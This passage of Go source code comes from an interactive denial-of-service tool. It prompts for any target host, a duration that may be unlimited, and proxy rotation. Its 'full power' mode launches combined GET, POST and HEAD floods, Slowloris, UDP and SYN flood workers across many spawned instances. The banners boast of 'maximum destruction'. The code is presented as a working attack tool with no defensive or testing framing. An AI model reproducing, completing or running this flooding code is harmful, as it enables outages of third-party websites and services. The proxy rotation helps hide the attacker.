		fmt.Printf("%s[i] Multi-method sends HTTP only — a server must be listening on that host:port or stats will show failures.%s\n", Blue, Reset)
	}

	fmt.Printf("%sDuration in seconds (0 for unlimited): %s", Green, Reset)
	durationInput, _ := reader.ReadString('\n')
	durationInput = strings.TrimSpace(durationInput)
	duration, _ := strconv.Atoi(durationInput)
	if duration < 0 {
		duration = 0
	}

	fmt.Printf("%sUse proxy rotation? (y/n): %s", Yellow, Reset)
	proxyInput, _ := reader.ReadString('\n')
	useProxies := strings.ToLower(strings.TrimSpace(proxyInput)) == "y"
	applyLocalProxyPolicy(target, &useProxies)

	fmt.Printf("\n%s[*] Analyzing system resources...%s\n", Yellow, Reset)
	time.Sleep(1 * time.Second)

	monitor := &ResourceMonitor{}
	updateResourceMonitor(monitor)

	fmt.Printf("%s[i] CPU: %.1f%% | RAM: %.1f%% | Network: %.1f Mbps%s\n", Blue, monitor.cpuPercent, monitor.memPercent, monitor.netUsageMbps, Reset)

	maxInstances := calculateMaxInstances(monitor)

	config := AttackConfig{
		Target:         target,
		Method:         "MIXED",
		Duration:       duration,
		WorkersPerCore: WORKER_MULTIPLIER,
		UseProxies:     useProxies,
		RandomHeaders:  true,
		FollowRedirect: false,
		InstanceID:     0,
	}

	fmt.Printf("\n%s════════════════════════════════════════════════════%s\n", Yellow, Reset)
	fmt.Printf("%s          MULTI-METHOD ATTACK ACTIVE%s\n", Yellow, Reset)
	fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Yellow, Reset)

	if maxInstances > 1 {
		launchMultipleInstances(maxInstances-1, config)
	}

	launchAttack(config, monitor)
}

func FullPowerAttack() {
	isMainInstance = true
	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("\n%s╔════════════════════════════════════════════════════╗%s\n", Red, Reset)
	fmt.Printf("%s║          %s!!! FULL POWER ATTACK MODE !!!%s           ║%s\n", Red, Red, Red, Reset)
	fmt.Printf("%s║         MAXIMUM DESTRUCTION AUTHORIZED           ║%s\n", Red, Reset)
	fmt.Printf("%s╚════════════════════════════════════════════════════╝%s\n\n", Red, Reset)

	fmt.Printf("%s[⚠️ ] This will use ALL available system resources!%s\n", Red, Reset)
	fmt.Printf("%s[⚠️ ] Are you sure? (yes/y or no): %s", Red, Reset)
	confirmation, _ := reader.ReadString('\n')
	c := strings.ToLower(strings.TrimSpace(confirmation))
	if c != "yes" && c != "y" {
		fmt.Printf("%s[*] Attack cancelled%s\n", Yellow, Reset)
		fmt.Printf("\n%sPress Enter to continue...%s", Green, Reset)
		reader.ReadString('\n')
		return
	}

	fmt.Printf("\n%sTarget (URL, hostname, or IP[:port]): %s", Green, Reset)
	target, _ := reader.ReadString('\n')
	target = normalizeDosTarget(target)

	if target == "" {
		fmt.Printf("%s[!] No target specified%s\n", Red, Reset)
		fmt.Printf("\n%sPress Enter to continue...%s", Green, Reset)
		reader.ReadString('\n')
		return
	}

	fmt.Printf("%sDuration in seconds (0 for unlimited): %s", Green, Reset)
	durationInput, _ := reader.ReadString('\n')
	durationInput = strings.TrimSpace(durationInput)
	duration, _ := strconv.Atoi(durationInput)
	if duration < 0 {
		duration = 0
	}

	useProxies := true
	applyLocalProxyPolicy(target, &useProxies)

	fmt.Printf("\n%s[*] Analyzing system resources...%s\n", Yellow, Reset)
	time.Sleep(1 * time.Second)

	monitor := &ResourceMonitor{}
	updateResourceMonitor(monitor)

	fmt.Printf("%s[i] CPU: %.1f%% | RAM: %.1f%% | Network: %.1f Mbps%s\n", Blue, monitor.cpuPercent, monitor.memPercent, monitor.netUsageMbps, Reset)

	maxInstances := calculateMaxInstances(monitor)

	config := AttackConfig{
		Target:         target,
		Method:         "FULL",
		Duration:       duration,
		WorkersPerCore: WORKER_MULTIPLIER * 2,
		UseProxies:     useProxies,
		RandomHeaders:  true,
		FollowRedirect: false,
		InstanceID:     0,
	}

	fmt.Printf("\n%s╔════════════════════════════════════════════════════╗%s\n", Red, Reset)
	fmt.Printf("%s║               FULL POWER ENGAGED%s                  ║%s\n", Red, Red, Reset)
	fmt.Printf("%s║        Nuclear Payload Initializing...%s            ║%s\n", Red, Red, Reset)
	fmt.Printf("%s╚════════════════════════════════════════════════════╝%s\n\n", Red, Reset)

	if maxInstances > 1 {
		launchMultipleInstances(maxInstances-1, config)
	}

	launchFullPowerAttack(config, monitor)
}

func launchFullPowerAttack(config AttackConfig, monitor *ResourceMonitor) {
	attackRunning = true
	successfulHits = 0
	failedHits = 0
	totalRequests = 0
	totalBytes = 0

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	startTime := time.Now()

	numWorkers := runtime.NumCPU() * config.WorkersPerCore

	var wg sync.WaitGroup

	fmt.Printf("%s[✓] FULL POWER attack launched with %d workers%s\n", Red, numWorkers, Reset)
	fmt.Printf("%s[*] Target: %s%s\n", Yellow, config.Target, Reset)
	fmt.Printf("%s[*] Combining: GET + POST + HEAD + SLOWLORIS + UDP + SYN%s\n", Red, Reset)
	if config.Duration > 0 {
		fmt.Printf("%s[*] Duration: %d seconds%s\n", Yellow, config.Duration, Reset)
	} else {
		fmt.Printf("%s[*] Duration: Unlimited (Press Ctrl+C to stop)%s\n", Yellow, Reset)
	}
	fmt.Printf("\n%s[⚡] ATTACK IN PROGRESS - SYSTEM UNDER LOAD%s\n\n", Red, Reset)

	go displayLiveStats(startTime)

	go monitorResourcesWithLimit(monitor)

	methods := []string{"GET", "POST", "HEAD", "SLOWLORIS", "UDP", "SYN"}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			method := methods[workerID%len(methods)]

			switch method {
			case "GET":
				httpFloodWorker(config, "GET")
			case "POST":
				httpFloodWorker(config, "POST")
			case "HEAD":
				httpFloodWorker(config, "HEAD")
			case "SLOWLORIS":
				slowlorisWorker(config)
			case "UDP":
				udpFloodWorker(config)
			case "SYN":
				synFloodWorker(config)
			}
		}(i)
	}

	if config.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(config.Duration) * time.Second)
			sigChan <- syscall.SIGTERM
		}()
	}

	<-sigChan

	attackRunning = false

	fmt.Printf("\n\n%s[*] Stopping full power attack...%s\n", Yellow, Reset)

	wg.Wait()

	stopAllInstances()

	time.Sleep(1 * time.Second)

	displayFinalStats(startTime)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("\n%sPress Enter to return to menu...%s", Green, Reset)
	reader.ReadString('\n')
}

func monitorResourcesWithLimit(monitor *ResourceMonitor) {
	ticker := time.NewTicker(CHECK_INTERVAL)
	defer ticker.Stop()

	for range ticker.C {
		if !attackRunning {
			return
		}

		updateResourceMonitor(monitor)

		if monitor.cpuPercent > MAX_CPU_PERCENT+5 || monitor.memPercent > MAX_MEM_PERCENT+5 || monitor.netUsageMbps > 100 {
			fmt.Printf("\n%s[⚠️  ] Resource limit approaching! Closing one instance...%s\n", Yellow, Reset)
			if len(instances) > 0 {
				cmd := instances[0]
				if cmd.Process != nil {
					cmd.Process.Kill()
				}
				instances = instances[1:]
			}
		}
	}
}
